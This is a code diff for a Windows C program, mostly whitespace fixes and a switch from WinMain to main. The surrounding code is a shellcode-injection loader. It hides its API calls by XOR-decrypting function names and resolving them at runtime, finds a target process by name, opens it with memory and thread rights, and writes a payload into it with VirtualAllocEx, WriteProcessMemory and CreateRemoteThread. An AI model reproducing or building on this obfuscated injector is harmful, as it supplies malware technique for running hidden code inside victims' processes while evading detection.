@@ -65,7 +65,7 @@ BOOL (WINAPI * pProcess32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
 
 void XOR(char * data, size_t data_len, char * key, size_t key_len) {
     int j;
-    
+
     j = 0;
     for (int i = 0; i < data_len; i++) {
             if (j == key_len - 1) j = 0;
@@ -86,26 +86,26 @@ int FindTarget(const char *procname) {
 
         XOR((char *) s_p32n, s_p32n_len, f_key, sizeof(f_key));
         pProcess32Next = GetProcAddress(GetModuleHandle("kernel32.dll"), s_p32n);
-        
+
         hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
-                
-        pe32.dwSize = sizeof(PROCESSENTRY32); 
-                
+
+        pe32.dwSize = sizeof(PROCESSENTRY32);
+
         if (!pProcess32First(hProcSnap, &pe32)) {
                 pCloseHandle(hProcSnap);
                 return 0;
         }
-                
+
         while (pProcess32Next(hProcSnap, &pe32)) {
                 if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                         pid = pe32.th32ProcessID;
                         break;
                 }
         }
-                
+
         pCloseHandle(hProcSnap);
-                
+
         return pid;
 }
 
@@ -114,7 +114,7 @@ int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
 
         LPVOID pRemoteCode = NULL;
         HANDLE hThread = NULL;
-  
+
          // decrypt VirtualAllocEx function call
         XOR((char *) s_vaex, s_vaex_len, f_key, sizeof(f_key));
         pVirtualAllocEx = GetProcAddress(GetModuleHandle("kernel32.dll"), s_vaex);
@@ -122,9 +122,9 @@ int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
 
         // decrypt WriteProcessMemory function call
         XOR((char *) s_wpm, s_wpm_len, f_key, sizeof(f_key));
-        pWriteProcessMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), s_wpm);        
+        pWriteProcessMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), s_wpm);
         pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
-        
+
         // decrypt CreateRemoteThread function call
         XOR((char *) s_cth, s_cth_len, f_key, sizeof(f_key));
         pCreateRemoteThread = GetProcAddress(GetModuleHandle("kernel32.dll"), s_cth);
@@ -143,9 +143,11 @@ int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
 }
 
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
-    LPSTR lpCmdLine, int nCmdShow) {
-    
+// int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
+//     LPSTR lpCmdLine, int nCmdShow) {
+
+int main(void) {
+
     int pid = 0;
     HANDLE hProc = NULL;
 
@@ -164,7 +166,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
         pOpenProcess = GetProcAddress(GetModuleHandle("kernel32.dll"), s_op);
 
         // try to open target process
-        hProc = pOpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
+        hProc = pOpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                         PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                         FALSE, (DWORD) pid);
 
